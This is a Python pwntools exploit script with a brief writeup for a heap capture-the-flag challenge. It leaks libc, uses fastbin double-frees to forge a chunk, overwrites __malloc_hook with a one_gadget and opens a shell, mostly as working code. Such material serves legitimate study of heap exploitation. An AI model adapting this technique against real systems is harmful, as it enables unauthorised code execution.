#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="debug"
import time
import os
#-----------------------------------------------------------
'''
checksec checks
NX ENABLED - NO SHELLCODE ON THE STACK CAN BE EXECUTED 
PIE ENABLED - THE POSITION KEEPS CHANGING IN THE CODE (POSITION INDEPENDENT EXECUTABLE)
PARTIAL RELRO- CAN READ ONLY A FEW BYTES ALTHOUGH NOT THAT IMPORTANT
#calling conventions
 RDI,RSI,RDX,RCX,R8,R7 ...
'''
#============================#============================#============================
gdb_script='''
	b *0x401498
'''

path="./fastbin_dup_2"
def check():
	log.warning(os.system(f'file {path}'))
	log.warning(os.system(f'checksec {path}'))
	log.warning(os.system(f'ldd {path}'))

if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
HOST="saturn.picoctf.net"
PORT= 50266
context.binary = elf
p=process(path)
argument=sys.argv[1]
libc=elf.libc
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)
if argument=='g':
	p=process(path)
	gdb.attach(p,gdbscript=gdb_script)


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
index=0
def malloc(size,data):
	global index
	sla(">","1")
	sla(":",str(size))
	sla(":",data)
	index+=1
	return index-1
def free(index):
	sla(">","2")
	sla(":",str(index))
libc_leak=int(ru("quit").split()[-7].decode(),16)
libc.address=libc_leak- libc.sym.puts
log.success(f"\033[92mlibc puts | {hex(libc_leak)}\033[0m")
log.success(f"\033[92mlibc base | {hex(libc.address)}\033[0m")
chunk_1=malloc(0x48,b"A"*8) # create chunk A 
chunk_2=malloc(0x48,b"B"*8) # create chunk B
'''
# demonstrating a double-free as there is no check and essentially gives us 
# pointer control.
# /*
# 	free -> one goes to the fastbins 1 
# 	free -> two goes to the fastbins 2
# 	free -> one(again) double free points to the next allocated chunk data

# 				*/
'''
free(chunk_1)
free(chunk_2)
free(chunk_1)

chunk3=malloc(0x48,p64(0x61))
chunk4=malloc(0x48,"C"*8)
chunk5=malloc(0x48,"D"*8)

chunk6=malloc(0x58,"A"*8)
chunk7=malloc(0x58,"B"*8)
one_gadget=libc.address+0xe1fa1
free(chunk6)
free(chunk7)
free(chunk6)

dup_to_malloc=malloc(0x58,p64(libc.sym.main_arena+0x20))
chunk_8=malloc(0x58,"-s\0")
chunk_9=malloc(0x58,"rubbish")
malloc_hook=malloc(0x58,b"Y"*48 + p64(libc.sym.__malloc_hook-35))

binsh=malloc(0x28,b"A"*19 + p64(one_gadget))
# gdb.attach(p)


# flag = hlb{duped_me_twice}
'''
Brief writeup

1. use the fastbin dup to create a 0x61 size field in the main_arena
2. use the second fastbin dup create a fake chunk to allocate
3. overwrite the pointer to the top chunk pointer of that chunk to the address of
malloc hook
4. depending on this program the argv 1 should equal to 0 for the onegadget to
work but we don't have that condition but we control the argv 1 data and we can pass a 
-s\0 to read from stdin to create a shell now  

'''
ia()